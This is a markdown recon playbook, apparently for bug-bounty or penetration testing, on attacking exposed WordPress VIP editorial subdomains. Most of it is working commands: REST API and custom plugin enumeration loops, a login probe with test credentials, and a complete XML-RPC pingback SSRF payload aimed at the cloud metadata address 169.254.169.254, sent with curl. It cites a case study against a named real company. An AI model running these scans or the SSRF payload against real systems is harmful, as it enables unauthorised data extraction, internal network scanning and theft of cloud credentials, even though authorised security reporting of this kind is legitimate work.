# WordPress VIP Editorial Subdomain — CRITICAL Recon Pattern

## When to Use
When a target has WordPress VIP-hosted subdomains with `*-editor.*`, `*-admin.*`, or similar naming conventions. These are **internal editorial/administrative platforms** that should never be publicly accessible.

## Attack Pattern
```
Corporate Domain → Subdomain Discovery → Editor/Admin Subdomain → WP REST API Dump → Custom Plugin API Enumeration → Data Extraction → SSRF via XML-RPC
```

## Critical Findings Pattern

### 1. WP REST API Fully Exposed (CRITICAL)
Editorial subdomains (`*-editor.target.com`) should be behind authentication + IP whitelisting. When exposed:
```
/wp-json/wp/v2/posts        → all posts readable (1 total)
/wp-json/wp/v2/pages        → all pages readable (116 total)
/wp-json/wp/v2/bios         → all employee bios readable (50 total)
/wp-json/wp/v2/stories      → all stories readable (2,355 total)
/wp-json/wp/v2/videos       → all videos readable (48 total)
/wp-json/wp/v2/media        → all media readable (14,043 total)
/wp-json/wp/v2/categories   → all taxonomies readable
```

**Impact:** Full content database dump + employee directory + media library without authentication.

**Validation:** Check `X-WP-Total` and `X-WP-TotalPages` headers for total item counts.

### 2. Custom Plugin API Fully Exposed (CRITICAL)
Custom WP plugins register under `/wp-json/<plugin-name>/v1/`:
```
/wp-json/corpnews/v1/stories     → 2,355 stories
/wp-json/corpnews/v1/bios        → 50 employee profiles (titles, LinkedIn, headshots)
/wp-json/corpnews/v1/videos      → 48 videos
/wp-json/corpnews/v1/pages       → 116 corporate pages (media kits, fact sheets)
/wp-json/corpnews/v1/collection  → 9 content collections with nested slugs
/wp-json/corpnews/v1/redirects   → 173 URL redirects (internal URL architecture)
/wp-json/corpnews/v1/images      → image endpoint
/wp-json/corpnews/v1/tags        → taxonomy tags
/wp-json/corpnews/v1/search      → story search
/wp-json/corpnews/v1/bootstrap   → bootstrap config
/wp-json/corpnews/v1/home        → homepage data + brand list
/wp-json/corpnews/v1/blocks/posts → block API posts
/wp-json/corpnews/v1/menu/29     → navigation menu data
/wp-json/corpnews/v1/multimedia  → multimedia data
/wp-json/corpnews/v1/multimedia/landing → landing page data
```

**Response format:** Custom plugins use `{\"posts\": [...], \"images\": [...], \"collection\": \"...\"}` format (NOT standard WP array). Pagination via `per_page=1000`.

**Impact:** Corporate intelligence dump — press releases, financial results, expansion plans, CEO messages, brand taxonomy.

### 3. XML-RPC Pingback SSRF (HIGH)
```
/xmlrpc.php → fully enabled
pingback.ping → SSRF vector (faultCode=0 when target is not WP)
pingback.ping → SSRF to internal IPs confirmed (169.254.169.254 returns 'Invalid discovery target')
pingback.ping → SSRF to localhost confirmed (127.0.0.1 returns empty faultString)
```

**Payload:**
```xml
POST /xmlrpc.php HTTP/1.1
Host: stories-editor.target.com
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
<param><value><string>http://stories-editor.target.com/stories/valid-post</string></value></param>
</params>
</methodCall>
```

**Impact:** Internal network scanning, cloud metadata access (AWS/GCP/Azure), SSRF chain to bypass firewalls.

### 4. WP Admin Login Public (MEDIUM)
```
/wp-login.php → HTTP 200 (publicly accessible)
POST /wp-login.php with test creds → HTTP 200
```

**Impact:** Brute-force surface, user enumeration via error messages.

### 5. WordPress VIP Headers (Informational)
```
x-rq: sin1 0 30 9980     → San Francisco datacenter
x-cache: MISS             → Origin server hit
x-distributor: yes        → WP Distributor plugin active
host-header: a9130478...  → WP VIP host header hash
x-robots-tag: noindex     → Google told not to index
CSP: frame-src self + stories-editor/story → Tight CSP
```

## What to Report

| Finding | Severity | CVSS |
|---------|----------|------|
| WP REST API fully exposed on editorial subdomain | CRITICAL | 9.1 |
| XML-RPC pingback SSRF | HIGH | 7.4 |
| WP Admin login public | MEDIUM | 5.3 |
| Employee bios + PII | MEDIUM | 4.8 |
| Corporate intelligence dump | MEDIUM | 5.0 |
| WP VIP infrastructure disclosure | LOW | 3.7 |

## Recon Commands

### Full WP REST API Enumeration
```bash
base="https://editorial-subdomain.target.com"
for ptype in posts pages bios stories videos media; do
  total=$(curl -s --max-time 5 -D - -o /dev/null "$base/wp-json/wp/v2/$ptype?per_page=1" -H "Host: $base" 2>/dev/null | grep -i "X-WP-Total" | tr -d '\r')
  echo "$ptype: $total"
done
```

### Custom Plugin API Discovery
```bash
base="https://editorial-subdomain.target.com"
# 1. Dump WP-JSON schema
curl -s "$base/wp-json/" -H "Host: editorial-subdomain.target.com" | python3 -c "import json,sys;d=json.load(sys.stdin);[print(f'  {k}') for k in d.keys()]"
# 2. Test discovered plugin routes
for path in stories bios pages videos images tags redirects collection bootstrap home menu multimedia blocks search embed; do
  code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "$base/wp-json/<plugin>/v1/$path" -H "Host: editorial-subdomain.target.com")
  echo "  /v1/$path → HTTP $code"
done
```

### XML-RPC SSRF Check
```bash
xml_data='''<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
<param><value><string>http://editorial-subdomain.target.com/stories/test</string></value></param>
</params>
</methodCall>'''
curl -s --max-time 8 -X POST -H "Host: editorial-subdomain.target.com" -d "$xml_data" "https://editorial-subdomain.target.com/xmlrpc.php"
# faultCode=0 + faultString='' → SSRF ATTEMPTED (target not WP)
# faultCode=0 + faultString='Invalid discovery target' → SSRF REACHED internal IP
```

### Akamai/CDN Challenge Pattern
```bash
# Main domain (often SPA behind CDN challenge)
main_bytes=$(curl -s --max-time 5 "https://stories.target.com/" -H "Host: stories.target.com" | wc -c)
# < 100 bytes = CDN challenge, not a vulnerability

# API subdomain (may bypass challenge)
api_code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "https://stories-editor.target.com/wp-json/" -H "Host: stories-editor.target.com")
# 200 = WP REST API accessible
```

## Known Non-Exploitable Patterns
- `GET /wp-json/wp/v2/users` → 404 on WordPress VIP (user enumeration blocked)
- Main domain returning < 100 bytes via curl → CDN challenge, not a vulnerability
- DELETE/PUT on story endpoints → 401 `rest_cannot_edit` (auth required)
- SSO parameter injection → blocked by IdP vendor (OneLogin, Okta)

## Files Referenced
- `hilton-recon.md` — Full Hilton case study with Phase 1, 2, and 3 findings (CRITICAL WP REST API exposure + XML-RPC SSRF)
- `enterprise-wp-custom-plugin-api-recon.md` — Plugin API discovery workflow
